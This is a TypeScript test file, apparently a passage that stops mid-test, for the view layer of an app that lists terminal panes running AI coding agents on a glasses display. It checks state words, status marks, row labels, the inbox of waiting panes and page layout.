// The list's rows and layout, and the columns' mark: what the glasses say
// about a pane is only what the hub said or what its output shows.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { agentOf, type Mail, type Pane, type Talk } from '../../src/protocol.ts'
import { BANNER_Y, LINE_H, MAX_BLOCKS, RULE_H } from '../../src/glasses.ts'
import { choiceAnswer } from '../../src/answers.ts'
import { INBOX_ROWS, LIST_ROWS, MENU, OFFER_BYTES, answersPage, askPage, canClose, canPark, closeQuestion, confirmPage, defaultSession, endName, heardPage, hostLine, involves, listedHosts, mailBackTo, mailEntries, mailLayout, mailPage, messagesLayout, messagesPage, paneMenu, partnerOf, sessionName, sessionPage, splitDirection, underRows, inboxLabel, inboxLayout, inboxPage, inboxWindow, isWorking, listLayout, listPage, listWindow, listenPage, markOf, moreAnswersPage, neighbour, noticeRow, offerOf, offerPage, panePage, placeWord, rowLabel, selectedPanes, sorted, splitPage, stateWord, titleOf, turning, waiting, type Model } from '../../src/views.ts'
import { groupsOf } from '../../src/groups.ts'
import { textWidth } from '../../src/text.ts'

const NOW = 1_000_000

function pane(path: string, extra: Partial<Pane> = {}): Pane {
  const p = { address: 'alice-laptop/' + path, host: 'alice-laptop', path, writable: true, command: 'claude', title: '', alias: '', cwd: '', agent: '' as const, attention: '' as const, attentionAt: 0, attentionText: '', choices: [], activity: NOW - 30, moving: false, working: false, talk: [], mail: 0, later: false, laterAt: 0, id: '', session: 'w', window: 0, width: 80, height: 24, last: false, ...extra }
  return { ...p, agent: extra.agent ?? agentOf(p.command, p.title), moving: extra.moving ?? (p.activity > 0 && NOW - p.activity <= 10) }
}

function model(panes: Pane[], extra: Partial<Model> = {}): Model {
  return {
    configured: true,
    panes: sorted(panes),
    hosts: [{ name: 'alice-laptop', online: true, later: true, sessions: false, close: false, mail: false, keys: 2 }],
    listError: null,
    needsYou: null,
    flash: null,
    toast: null,
    lens: true,
    canSpeak: false,
    loaded: true,
    dots: 1,
    selected: [],
    selecting: false,
    cursor: 0,
    windowStart: 0,
    marked: -1,
    inbox: null,
    inboxCursor: 0,
    inboxStart: 0,
    feed: false,
    unseen: 0,
    reading: () => undefined,
    ...extra,
  }
}

test('the state word says only what is known: a harness works while its screen moves, ten seconds', () => {
  assert.equal(stateWord(pane('a/0.0', { attention: 'permission' }), NOW), 'needs permission')
  assert.equal(stateWord(pane('a/0.0', { attention: 'done' }), NOW), 'done')
  assert.equal(stateWord(pane('a/0.0'), NOW), 'quiet 30s')
  assert.equal(stateWord(pane('a/0.0', { activity: NOW - 9 }), NOW), 'working')
  assert.equal(stateWord(pane('a/0.0', { activity: NOW - 10 }), NOW), 'working')
  assert.equal(stateWord(pane('a/0.0', { activity: NOW - 11 }), NOW), 'quiet 11s')
  assert.equal(stateWord(pane('a/0.0', { activity: NOW - 60 }), NOW), 'quiet 1m')
  assert.equal(stateWord(pane('a/0.0', { activity: NOW - 4 * 3600 }), NOW), 'quiet 4h')
  assert.equal(stateWord(pane('a/0.0', { activity: 0 }), NOW), '')
  // Any other program says active while it moves, never working.
  assert.equal(stateWord(pane('a/0.0', { command: 'bash', activity: NOW - 9 }), NOW), 'active')
  assert.equal(stateWord(pane('a/0.0', { command: 'bash', activity: NOW - 11 }), NOW), 'quiet 11s')
  assert.equal(stateWord(pane('a/0.0', { command: 'bash', working: true, activity: NOW - 90 }), NOW), 'quiet 1m')
  // The harness said working: the word until its next event, however still the screen.
  assert.equal(stateWord(pane('a/0.0', { working: true }), NOW), 'working')
  assert.equal(stateWord(pane('a/0.0', { working: true, activity: NOW - 90 }), NOW), 'working')
  assert.equal(stateWord(pane('a/0.0', { working: true, activity: NOW - 4 * 3600 }), NOW), 'working')
  assert.equal(stateWord(pane('a/0.0', { working: true, activity: 0 }), NOW), 'working')
  assert.equal(stateWord(pane('a/0.0', { working: true, attention: 'done' }), NOW), 'done')
  // An idle notice while the screen still moves is working; once it is still, idle. A question is never masked.
  assert.equal(stateWord(pane('a/0.0', { attention: 'idle', activity: NOW - 5 }), NOW), 'working')
  assert.equal(stateWord(pane('a/0.0', { attention: 'idle', activity: NOW - 15 }), NOW), 'idle')
  assert.equal(stateWord(pane('a/0.0', { attention: 'question', activity: NOW - 5 }), NOW), 'asks a question')
  assert.equal(isWorking(pane('a/0.0', { attention: 'idle', activity: NOW - 5 })), true)
  assert.equal(isWorking(pane('a/0.0', { attention: 'idle', activity: NOW - 5, later: true })), false)
  // A time ahead of now is clamped by the parser; here it must not go negative either.
  assert.equal(stateWord(pane('a/0.0', { activity: NOW + 500, moving: true }), NOW), 'working')
})

test('the marks: the attention\'s, the half circle turned by the second while working, the dotted ring otherwise', () => {
  assert.equal(markOf(pane('a/0.0', { attention: 'question' }), NOW), '★')
  assert.equal(markOf(pane('a/0.0', { attention: 'permission' }), NOW), '★')
  assert.equal(markOf(pane('a/0.0', { attention: 'done' }), NOW), '√')
  assert.equal(markOf(pane('a/0.0', { attention: 'idle' }), NOW), '○')
  assert.equal(markOf(pane('a/0.0'), NOW), '◌')
  assert.equal(markOf(pane('a/0.0', { activity: NOW - 400 }), NOW), '◌')
  assert.equal(markOf(pane('a/0.0', { working: true }), NOW), '◐')
  assert.equal(markOf(pane('a/0.0', { working: true }), NOW + 1), '◑')
  assert.equal(markOf(pane('a/0.0', { activity: NOW - 3 }), NOW), '◐')
  assert.equal(markOf(pane('a/0.0', { command: 'bash', activity: NOW - 3 }), NOW), '◌')
  // The harness's word wins over the screen's age; the attention wins over working, but an idle while moving.
  assert.equal(markOf(pane('a/0.0', { working: true, activity: NOW - 90 }), NOW), '◐')
  assert.equal(markOf(pane('a/0.0', { working: true, attention: 'done' }), NOW), '√')
  assert.equal(markOf(pane('a/0.0', { attention: 'idle', activity: NOW - 3 }), NOW), '◐')
})

test('a working pane is plain: its row and title are a quiet pane\'s but for the mark and the word, and the inbox has no place for it', () => {
  const quiet = pane('work/0.0', { command: 'codex', title: 'build', activity: NOW - 30 })
  const busy = pane('work/0.0', { command: 'codex', title: 'build', activity: NOW - 30, working: true })
  assert.equal(rowLabel(quiet, NOW), '◌ Codex · build · quiet 30s')
  assert.equal(rowLabel(busy, NOW), '◐ Codex · build · working')
  assert.equal(rowLabel(busy, NOW + 1), '◑ Codex · build · working')
  assert.equal(titleOf(busy, groupsOf([busy]), NOW), '◐ Codex · build')
  assert.equal(titleOf(quiet, groupsOf([quiet]), NOW), '◌ Codex · build')
  // The rows share one strength; the title is at full strength either way.
  for (const p of [quiet, busy]) {
    const row = listPage(model([p]), NOW).blocks.find((b) => b.name?.startsWith('rows'))
    assert.equal(row?.level, 3)
    const title = panePage(model([p]), p, undefined, { offset: 0, reveal: false, state: 'following' }, NOW).blocks.find((b) => b.name === 'title')
    assert.equal(title?.level, 4)
  }
  assert.deepEqual(waiting([busy]), [])
  // A page with a turning mark is drawn again next second; one without is not.
  assert.equal(turning(listPage(model([busy]), NOW)), true)
  assert.equal(turning(listPage(model([quiet]), NOW)), false)
  assert.equal(turning(panePage(model([busy]), busy, undefined, { offset: 0, reveal: false, state: 'following' }, NOW)), true)
  assert.equal(turning(panePage(model([quiet]), quiet, { raw: ['◐ in the pane text'], error: null }, { offset: 0, reveal: false, state: 'following' }, NOW)), false)
})

test('a named pane: the alias first, the program, then what the program says; the folder after the name while the line has room', () => {
  const review = pane('work/0.0', { alias: 'review', title: '✳ fixing the build', cwd: '/home/alice/src/muxway' })
  assert.equal(rowLabel(review, NOW), '◌ review · /muxway · Claude · fixing the build · quiet 30s')
  // The title block is 356 px: this one is 395 with the folder, so the title goes without it.
  assert.equal(titleOf(review, groupsOf([review]), NOW), '◌ review · Claude · fixing the build')
  assert.equal(titleOf(review, groupsOf([review]), NOW, 400), '◌ review · /muxway · Claude · fixing the build')
  const notes = pane('work/1.0', { alias: 'notes', command: 'bash', title: 'notes.md', cwd: '/home/alice/src' })
  assert.equal(rowLabel(notes, NOW), '◌ notes · /src · bash · notes.md · quiet 30s')
  assert.equal(titleOf(notes, groupsOf([notes]), NOW), '◌ notes · /src · bash · notes.md')
  // Without an alias a harness is the name, the folder after it, and what it says is its status.
  const build = pane('work/2.0', { title: '✳ build', cwd: '/home/alice/src/muxway' })
  assert.equal(rowLabel(build, NOW), '◌ Claude · /muxway · build · quiet 30s')
  assert.equal(titleOf(build, groupsOf([build]), NOW), '◌ Claude · /muxway · build')
  // A status that repeats the name is left out; a title that says nothing gives none.
  assert.equal(rowLabel(pane('work/3.0', { alias: 'build', title: '✳ build' }), NOW), '◌ build · Claude · quiet 30s')
  assert.equal(rowLabel(pane('work/3.0', { alias: 'build', title: 'claude' }), NOW), '◌ build · Claude · quiet 30s')
  assert.equal(rowLabel(pane('work/3.0', { alias: 'build', title: '' }), NOW), '◌ build · Claude · quiet 30s')
  // A folder without a cwd: none; a reader gets none from the hub, and the row is as before.
  assert.equal(rowLabel(pane('work/4.0', { alias: 'review', title: '✳ fixing the build', writable: false }), NOW), '◌ review · Claude · fixing the build · quiet 30s · read-only')
  // The folder goes first when the line is too wide, in the row, the title and a column.
  const long = pane('work/5.0', { alias: 'review', title: '✳ ' + 'word '.repeat(12).trim(), cwd: '/home/alice/src/muxway' })
  assert.equal(rowLabel(long, NOW), `◌ review · Claude · ${'word '.repeat(12).trim()} · quiet 30s`)
  assert.equal(titleOf(long, groupsOf([long]), NOW), `◌ review · Claude · ${'word '.repeat(12).trim()}`)
  assert.equal(titleOf(review, groupsOf([review]), NOW, 180), '◌ review · Claude · fixing the build')
  assert.equal(rowLabel(long, NOW, 'on', true), `│ [x] ◌ review · Claude · ${'word '.repeat(12).trim()} · quiet 30s`)
  // The inbox row keeps the name alone: the kind and the age matter more in its 63 bytes.
  assert.equal(inboxLabel({ ...review, attention: 'permission', attentionAt: NOW - 60 }, NOW), '★ review · Claude · needs permission · 1m')
})

test('a row: mark, name, program, state, read-only, and the selection prefix', () => {
  assert.equal(rowLabel(pane('work/0.0', { title: 'build', attention: 'question' }), NOW), '★ Claude · build · asks a question')
  assert.equal(rowLabel(pane('work/0.0', { title: 'build', activity: NOW - 240 }), NOW, 'on'), '[x] ◌ Claude · build · quiet 4m')
  assert.equal(rowLabel(pane('work/0.0', { title: 'build' }), NOW, 'off'), '[ ] ◌ Claude · build · quiet 30s')
  assert.equal(rowLabel(pane('work/0.0', { command: 'bash', writable: false }), NOW), '◌ bash · quiet 30s · read-only')
  // Every harness is named, and the name leads; what the program says is its status.
  assert.equal(rowLabel(pane('work/0.0', { command: 'codex', title: 'codex', working: true }), NOW), '◐ Codex · working')
  assert.equal(rowLabel(pane('work/0.0', { command: 'agy', title: 'notes' }), NOW), '◌ Antigravity · notes · quiet 30s')
  assert.equal(rowLabel(pane('work/0.0', { command: 'node', title: 'gemini' }), NOW), '◌ Gemini · quiet 30s')
  // Any other program is named with what it says: the command, then the title.
  assert.equal(rowLabel(pane('work/0.0', { command: 'node', title: 'server' }), NOW), '◌ node · server · quiet 30s')
  assert.equal(rowLabel(pane('work/0.0', { command: 'vim', title: 'notes.md' }), NOW), '◌ vim · notes.md · quiet 30s')
  // The title of a pane named after the program says nothing: the row has the program once.
  assert.equal(rowLabel(pane('work/0.0', { command: 'opencode', title: 'OpenCode' }), NOW), '◌ OpenCode · quiet 30s')
})

test('the inbox: the first row of the list while anything waits, the count in the hint, the page oldest first', () => {
  const quiet = [pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two' })]
  let l = listLayout(model(quiet), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['host', 'pane', 'pane'])
  assert.ok(!listPage(model(quiet), NOW).hint.includes('◆'))
  const panes = [
    pane('w/1.0', { title: 'one', attention: 'done', attentionAt: NOW - 30 }),
    pane('w/2.0', { title: 'two', attention: 'question', attentionAt: NOW - 200, choices: ['yes', 'no'] }),
    pane('w/3.0', { title: 'three' }),
    pane('w/4.0', { title: 'four', command: 'codex', attention: 'permission', attentionAt: NOW - 100 }),
  ]
  l = listLayout(model(panes), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['inbox', 'host', 'pane', 'pane', 'pane', 'pane'])
  assert.equal(l.items[0], '◆ inbox · 3 waiting')
  assert.ok(listPage(model(panes), NOW).hint.startsWith('◆ 3 · '), listPage(model(panes), NOW).hint)
  // In selection mode the inbox row has no box and is not an action.
  l = listLayout(model(panes, { selecting: true }), NOW)
  assert.equal(l.items[0], '◆ inbox · 3 waiting')
  assert.equal(l.items[1], '── alice-laptop · online ──')
  assert.equal(l.items[2], '[ ] ★ Claude · two · asks a question')
  assert.deepEqual(waiting(panes).map((p) => p.path), ['w/2.0', 'w/4.0', 'w/1.0'])
  assert.equal(inboxLabel(panes[3], NOW), '★ Codex · four · needs permission · 1m')
  assert.equal(inboxLabel(pane('w/5.0', { title: 'five', attention: 'idle', attentionAt: 0 }), NOW), '○ Claude · five · idle')
  // The page: the app's own rows, an entry's row and under it the notice's text and a question's choices.
  const withText = [
    { ...panes[1], attentionText: 'deploy to staging?' },
    { ...panes[3], attentionText: 'Codex needs your permission to run make' },
    panes[0],
  ]
  let page = inboxPage(model(panes, { inbox: withText }), NOW)
  assert.equal(page.kind, 'dash')
  const rowsOf = (pg: ReturnType<typeof inboxPage>) => pg.blocks.find((b) => b.name?.startsWith('rows'))!.lines
  assert.deepEqual(rowsOf(page).slice(0, 5), [
    '> ★ Claude · two · asks a question · 3m',
    '      deploy to staging? » yes · no',
    '  ★ Codex · four · needs permission · 1m',
    '      Codex needs your permission to run make',
    '  √ Claude · one · done · 30s',
  ])
  assert.deepEqual(inboxLayout(model(panes, { inbox: withText }), NOW).entry, [0, 0, 1, 1, 2])
  assert.equal(noticeRow(pane('w/9.0', { attention: 'question', choices: ['yes', 'no'] })), '    » yes · no')
  assert.equal(noticeRow(pane('w/9.0', { attention: 'done', attentionText: 'built' })), '    built')
  assert.equal(noticeRow(pane('w/9.0', { attention: 'done' })), '')
  assert.ok(page.hint.startsWith('inbox · 3 waiting · ▽ move · ● open · ≡ later · ×× back'), page.hint)
  assert.deepEqual(page.menu.map((e) => e.label), ['Later'])
  // The cursor on the second entry: its row marked, the menu for it; a parked entry offers Wake; a reader's nothing.
  page = inboxPage(model(panes, { inbox: withText, inboxCursor: 1 }), NOW)
  assert.ok(rowsOf(page)[2].startsWith('> ★ Codex'), rowsOf(page))
  const parked = [{ ...panes[0], later: true, laterAt: NOW - 5 }]
  assert.deepEqual(inboxPage(model(panes, { inbox: parked }), NOW).menu.map((e) => e.label), ['Wake'])
  assert.deepEqual(inboxPage(model(panes, { inbox: [{ ...panes[0], writable: false }] }), NOW).menu, [])
  assert.ok(inboxPage(model(panes, { inbox: [{ ...panes[0], writable: false }] }), NOW).hint.includes('● open · ×× back'))
  assert.deepEqual(rowsOf(inboxPage(model(panes, { inbox: [] }), NOW))[0], '  nothing waits for you')
  assert.deepEqual(rowsOf(inboxPage(model(panes), NOW))[0], '  reading the inbox…')
  // Twenty entries at most; the window keeps the cursor's entry whole.
  const many = Array.from({ length: 30 }, (_, i) => pane(`w/${i}.0`, { attention: 'done', attentionAt: NOW - i, attentionText: 'built' }))
  const lay = inboxLayout(model(many, { inbox: waiting(many) }), NOW)
  assert.equal(lay.items.length, INBOX_ROWS * 2)
  assert.equal(inboxWindow(lay.entry, 0, 0), 0)
  assert.equal(inboxWindow(lay.entry, 4, 0), 1, 'the fifth entry\'s second row is the tenth')
  assert.equal(inboxWindow(lay.entry, 19, 0), 40 - LIST_ROWS)
  assert.equal(inboxWindow(lay.entry, 0, 20), 0)
})

test('a parked pane: last in the order, zz and later with what waits underneath, counted after the awake ones, Wake in the menu', () => {
  const panes = [
    pane('w/1.0', { title: 'one', attention: 'permission', attentionAt: NOW - 30, later: true, laterAt: NOW - 20 }),
    pane('w/2.0', { title: 'two' }),
    pane('w/3.0', { title: 'three', attention: 'done', attentionAt: NOW - 100 }),
    pane('w/4.0', { title: 'four', later: true, laterAt: NOW - 50 }),
  ]
  assert.deepEqual(sorted(panes).map((p) => p.path), ['w/3.0', 'w/2.0', 'w/1.0', 'w/4.0'])
  assert.equal(markOf(panes[0], NOW), 'zz')
  assert.equal(stateWord(panes[0], NOW), 'later · needs permission')
  assert.equal(stateWord(panes[3], NOW), 'later')
  assert.equal(rowLabel(panes[0], NOW), 'zz Claude · one · later · needs permission')
  assert.equal(rowLabel(panes[3], NOW), 'zz Claude · four · later')
  assert.equal(titleOf(panes[0], groupsOf(panes), NOW), 'zz Claude · one')
  // The awake pane first, then the parked ones by their parking, whatever waits underneath.
  assert.deepEqual(waiting(panes).map((p) => p.path), ['w/3.0', 'w/4.0', 'w/1.0'])
  assert.equal(listLayout(model(panes), NOW).items[0], '◆ inbox · 3 waiting')
  assert.equal(inboxLabel(panes[0], NOW), 'zz Claude · one · later · needs permission · 30s')
  assert.equal(inboxLabel(panes[3], NOW), 'zz Claude · four · later · 50s')
  // A group holds a parked pane too.
  const talk = [pane('w/5.0', { title: 'a', talk: ['alice-laptop/w/6.0'] }), pane('w/6.0', { title: 'b', talk: ['alice-laptop/w/5.0'], later: true }), pane('w/7.0', { title: 'c' })]
  assert.deepEqual(sorted(talk).map((p) => p.path), ['w/5.0', 'w/6.0', 'w/7.0'])
  // The menu: Later on an awake writable pane, Wake on a parked one, nothing for a reader or an older host.
  const menuOf = (m: Model, p: Pane) => panePage(m, p, undefined, { offset: 0, reveal: false, state: 'following' }, NOW).menu.map((e) => e.label)
  assert.deepEqual(menuOf(model(panes), panes[1]), ['Reveal all', 'Bottom', 'Next pane', 'Previous pane', 'Later', '+ pane'])
  assert.deepEqual(menuOf(model(panes), panes[0]), ['Reveal all', 'Bottom', 'Next pane', 'Previous pane', 'Wake', '+ pane'])
  assert.ok(panePage(model(panes), panes[0], undefined, { offset: 0, reveal: false, state: 'following' }, NOW).menu.some((e) => e.id === MENU.later))
  assert.deepEqual(menuOf(model(panes), pane('w/8.0', { writable: false })), ['Reveal all', 'Bottom', 'Next pane', 'Previous pane'])
  const older = model(panes, { hosts: [{ name: 'alice-laptop', online: true, later: false, sessions: false, close: false, mail: false, keys: 2 }] })
  assert.deepEqual(menuOf(older, panes[1]), ['Reveal all', 'Bottom', 'Next pane', 'Previous pane', '+ pane'])
  assert.equal(canPark(older, panes[1]), false)
  assert.equal(canPark(model(panes), pane('w/9.0', { host: 'bob', address: 'bob/w/9.0' })), false)
})

test('a question with choices: its rows lead the answers, the confirmation says answer', () => {
  const p = pane('w/0.0', { title: 'build', attention: 'question', choices: ['yes', 'no'] })
  const choices = p.choices.map(choiceAnswer)
  assert.deepEqual(answersPage(model([p]), p, choices, null, true, "Claude Code's").items.slice(0, 4), ['» yes', '» no', '» Say it', 'Enter'])
  assert.deepEqual(answersPage(model([p]), p, [], null, false, null).items.slice(0, 1), ['Enter'])
  // The fixed eight, then the keys row and the program's commands row: twenty rows at most with eight choices, the suggestion and Say it.
  const full = answersPage(model([p]), p, Array.from({ length: 8 }, (_, i) => choiceAnswer('c' + i)), { label: '"go"', short: '"go"', pieces: [{ text: 'go' }, { key: 'Enter' }] }, true, "Claude Code's")
  assert.equal(full.items.length, 20)
  assert.deepEqual(full.items.slice(-3), ['Ctrl-C', '→ keys', "→ commands: Claude Code's"])
  assert.deepEqual(answersPage(model([p]), p, [], null, false, null).items.slice(-2), ['Ctrl-C', '→ keys'])
  const keys = moreAnswersPage(model([p]), p, 'keys', [{ label: 'PageUp', short: 'PageUp', pieces: [{ key: 'PageUp' }] }])
  assert.deepEqual([keys.kind, keys.items, keys.hint.startsWith('keys for build')], ['list', ['PageUp'], true])
  assert.deepEqual(choiceAnswer('deploy'), { label: '» deploy', short: 'deploy', pieces: [], choice: 'deploy' })
  assert.ok(confirmPage(model([p]), p, choices[0]).hint.startsWith('answer yes to build?'), confirmPage(model([p]), p, choices[0]).hint)
  assert.ok(confirmPage(model([p]), p, { label: 'Enter', short: 'Enter', pieces: [{ key: 'Enter' }] }).hint.startsWith('send Enter to build?'))
})

test('the layout: panes, then in selection mode the actions', () => {
  const panes = [pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two' }), pane('w/3.0', { title: 'three' })]
  let l = listLayout(model(panes), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['host', 'pane', 'pane', 'pane'])
  l = listLayout(model(panes, { selected: ['alice-laptop/w/2.0'] }), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['host', 'pane', 'pane', 'pane'], 'actions outside selection mode')
  l = listLayout(model(panes, { selected: ['alice-laptop/w/2.0'], selecting: true }), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['host', 'pane', 'pane', 'pane', 'clear'])
  assert.equal(l.items[2], '[x] ◌ Claude · two · quiet 30s')
  assert.equal(l.items[1], '[ ] ◌ Claude · one · quiet 30s')
  // The host line has no box.
  assert.equal(l.items[0], '── alice-laptop · online ──')
  l = listLayout(model(panes, { selecting: true }), NOW)
  assert.deepEqual(l.items.slice(4), ['→ leave selection'])
  l = listLayout(model(panes, { selected: ['alice-laptop/w/3.0', 'alice-laptop/w/1.0'], selecting: true }), NOW)
  assert.deepEqual(l.items.slice(4), ['→ open 2 side by side', '→ clear selection'])
  assert.deepEqual(selectedPanes(model(panes, { selected: ['alice-laptop/w/3.0', 'alice-laptop/w/1.0'] })).map((p) => p.path), ['w/1.0', 'w/3.0'])
  // A selected pane that left the listing counts for nothing.
  l = listLayout(model(panes, { selected: ['alice-laptop/w/9.0', 'alice-laptop/w/1.0'], selecting: true }), NOW)
  assert.deepEqual(l.what.map((w) => w.kind), ['host', 'pane', 'pane', 'pane', 'clear'])
})

test('the window slides only when the cursor leaves it', () => {
  assert.equal(listWindow(3, 2, 0), 0)
  assert.equal(listWindow(20, 0, 0), 0)
  assert.equal(listWindow(20, LIST_ROWS - 1, 0), 0)
  assert.equal(listWindow(20, LIST_ROWS, 0), 1)
  assert.equal(listWindow(20, 19, 0), 20 - LIST_ROWS)
  assert.equal(listWindow(20, 5, 5), 5)
  assert.equal(listWindow(20, 4, 5), 4)
  assert.equal(listWindow(5, 4, 9), 0)
  const panes = Array.from({ length: 40 }, (_, i) => pane(`w/${String(i).padStart(2, '0')}.0`))
  const l = listLayout(model(panes, { selected: ['alice-laptop/w/00.0', 'alice-laptop/w/39.0'], selecting: true }), NOW)
  assert.equal(l.items.length, 43)
  assert.deepEqual(l.what.slice(41).map((w) => w.kind), ['open', 'clear'])
})

test('before the first listing: one row and the dots in the hint', () => {
  const m = model([], { loaded: false, dots: 2 })
  assert.deepEqual(listLayout(m, NOW).items, ['reading the hub…'])
  assert.equal(listLayout(m, NOW).what[0].kind, 'none')
  assert.equal(listPage(m, NOW).hint, 'reading the hub ··')
  const offline = model([pane('w/0.0')], { hosts: [{ name: 'alice-laptop', online: false, later: true, sessions: false, close: false, mail: false, keys: 2 }] })
  assert.ok(listPage(offline, NOW).hint.startsWith('○ alice-laptop offline · '), listPage(offline, NOW).hint)
  assert.deepEqual(listLayout(model([], { configured: false }), NOW).items, ['set the hub and token on the phone'])
  assert.deepEqual(listLayout(model([]), NOW).items, ['no panes exposed to this token'])
})

test('every page ends above the banner: a toast grows the hint upward and the glasses refuse an overlap', () => {
  const panes = [pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two' })]
  const reading = { raw: Array.from({ length: 40 }, (_, i) => 'line ' + i), error: null }
  const m = model(panes, { toast: 'done: one', selected: ['alice-laptop/w/1.0', 'alice-laptop/w/2.0'], reading: () => reading })
  const p = panes[0]
  const voice = { phase: 'recording' as const, seconds: 12, text: 'W'.repeat(OFFER_BYTES), error: '', levels: [1, 2, 3] }
  const pages = {
    list: listPage(model(Array.from({ length: 10 }, (_, i) => pane(`w/${i}.0`)), { toast: 'x' }), NOW),
    columns: splitPage(m),
    pane: panePage(m, p, reading, { offset: 0, reveal: false, state: 'following' }),
    offer: offerPage(m, p, { label: '"x"', short: '"x"', pieces: [{ text: 'W'.repeat(OFFER_BYTES) }, { key: 'Enter' }] }),
    listening: listenPage(m, p, voice),
    transcribing: listenPage(m, p, { ...voice, phase: 'working' }),
    failed: listenPage(m, p, { ...voice, phase: 'error', error: 'too short' }),
    heard: heardPage(m, p, { ...voice, phase: 'review' }),
  }
  for (const [name, page] of Object.entries(pages)) {
    assert.ok(page.blocks.length > 0, `${name} draws blocks`)
    for (const b of page.blocks) assert.ok(b.y + b.h <= BANNER_Y, `${name}: ${b.name} ends at ${b.y + b.h}, under the banner at ${BANNER_Y}`)
  }
  // The pane keeps its eight lines; the title gives the rule its two pixels.
  assert.equal(pages.pane.blocks.find((b) => b.name === 'body')!.lines.length, 8)
  assert.equal(pages.pane.blocks.find((b) => b.name === 'title')!.h, LINE_H - RULE_H)
})

test('the rule under the title: a bordered block with nothing in it, the body right under', () => {
  const panes = [pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two' }), pane('w/3.0', { title: 'three' })]
  const reading = { raw: ['a', 'b'], error: null }
  const m = model(panes, { reading: () => reading })
  const at = (page: { blocks: { name?: string; y: number; h: number; border?: boolean; pad?: number }[] }, name: string) => page.blocks.find((b) => b.name === name)
  const page = panePage(m, panes[0], reading, { offset: 0, reveal: false, state: 'following' })
  const upper = at(page, 'rule1')!
  assert.deepEqual([upper.y, upper.h, upper.border, upper.pad], [LINE_H - RULE_H, RULE_H, true, 0])
  assert.equal(at(page, 'body')!.y, LINE_H, 'the body starts under the rule')
  // The title gives the corner to the catcher; the state beside it keeps the 192 px its words were chosen
  // for and ends short of the corner. Its place word is measured by that room.
  const state = page.blocks.find((b) => b.name === 'state')!
  assert.deepEqual([at(page, 'title')!.w, state.w, state.x + state.w], [356, 192, 560 - 4])
  const tight = Array.from({ length: 40 }, (_, n) => 'x'.repeat(n)).find((path) => textWidth(`read-only · ${path}`) > state.w - 4)!
  assert.equal(placeWord(pane(tight, { writable: false })), 'read-only')
  assert.equal(placeWord(pane('work/0.0', { writable: false })), 'read-only · work/0.0')
  // The columns too, eight lines each: with two the rule fits; three, their catcher and the hint are the
  // page's eight containers, so the rule goes.
  const two = splitPage(model(panes, { selected: panes.slice(0, 2).map((p) => p.address), reading: () => reading }))
  assert.deepEqual([at(two, 'rule1')!.y, at(two, 'col0')!.y, at(two, 'col0')!.lines.length], [LINE_H - RULE_H, LINE_H, 8])
  const cols = splitPage(model(panes, { selected: panes.map((p) => p.address), reading: () => reading }))
  assert.equal(at(cols, 'rule1'), undefined)
  assert.equal(cols.blocks.length, MAX_BLOCKS, `${cols.blocks.length} blocks`)
  assert.deepEqual([at(cols, 'col0')!.y, at(cols, 'col0')!.lines.length], [LINE_H, 8])
  // No page carries a lower rule: the hint's own box edge is that line, on every screen alike.
  assert.equal(at(page, 'rule2'), undefined)
  assert.equal(listPage(m, NOW).blocks.length, 2)
})

test('the list: nine rows in one block from the top down to the hint, the cursor a mark, no head', () => {
  const panes = Array.from({ length: 12 }, (_, i) => pane(`w/${i}.0`))
  // The host line is the first row; the cursor on the tenth pane is row 11.
  const page = listPage(model(panes, { cursor: 11 }), NOW)
  assert.equal(LIST_ROWS, 9)
  const rows = page.blocks[0]
  assert.equal(rows.name, 'rows3', 'the block is named by its window start')
  assert.equal(rows.lines.length, 9)
  assert.equal(rows.y, 0)
  assert.ok(rows.y + rows.h <= BANNER_Y && BANNER_Y - (rows.y + rows.h) < LINE_H, `the rows end at ${rows.y + rows.h}`)
  assert.ok(rows.lines[8].startsWith('> ') && rows.lines.filter((l) => l.startsWith('> ')).length === 1, rows.lines.join('|'))
  assert.equal('head' in page, false)
  // Fewer panes than rows: the block keeps its lines, the rest blank.
  assert.deepEqual(listPage(model(panes.slice(0, 2)), NOW).blocks[0].lines.slice(3), Array(6).fill(' '))
})

test('the catcher: on every page without an OS list exactly one block with nothing to show takes the gestures', () => {
  const panes = [pane('w/1.0', { title: 'one' }), pane('w/2.0', { title: 'two' })]
  const reading = { raw: ['a'], error: null }
  const m = model(panes, { selected: panes.map((p) => p.address), reading: () => reading })
  const voice = { phase: 'recording' as const, seconds: 3, text: 'hi', error: '', levels: [1] }
  const answer = { label: 'y', short: 'y', pieces: [{ text: 'y' }, { key: 'Enter' }] }
  const dash = {
    list: listPage(m, NOW),
    columns: splitPage(m),
    pane: panePage(m, panes[0], reading, { offset: 0, reveal: false, state: 'following' }),
    offer: offerPage(m, panes[0], answer),
    listening: listenPage(m, { kind: 'input', name: 'one' }, voice),
    transcribing: listenPage(m, { kind: 'input', name: 'one' }, { ...voice, phase: 'working' }),
    failed: listenPage(m, { kind: 'input', name: 'one' }, { ...voice, phase: 'error', error: 'too short' }),
    heard: heardPage(m, { kind: 'input', name: 'one' }, { ...voice, phase: 'review' }),
    inbox: inboxPage({ ...m, inbox: panes }, NOW),
  }
  for (const [name, page] of Object.entries(dash)) {
    const catchers = page.blocks.filter((b) => b.capture)
    assert.equal(catchers.length, 1, `${name}: ${catchers.length} catchers`)
    assert.equal(catchers[0].lines.join(''), '', `${name}: the catcher shows nothing`)
    // The unseen block in the corner on every one, the rule never: with the gestures on it the device refused the page.
    // One blank line tall, so the device has nothing to scroll and reports every scroll; the corner is its alone.
    assert.deepEqual([catchers[0].name, catchers[0].x, catchers[0].y, catchers[0].w, catchers[0].h, !!catchers[0].border], ['gesture', 560, 0, 16, LINE_H, false], name)
    // Nothing else sits in the corner.
    for (const b of page.blocks) if (b !== catchers[0]) assert.ok(b.y >= LINE_H || b.x + b.w <= 560, `${name}: ${b.name} reaches the corner`)
  }
  // Three columns leave the corner to the catcher too.
  const three = splitPage(model([...panes, pane('w/3.0', { title: 'three' })], { selected: [...panes.map((p) => p.address), 'w/3.0'], reading: () => reading }))
  assert.equal(three.blocks.filter((b) => b.capture).length, 1)
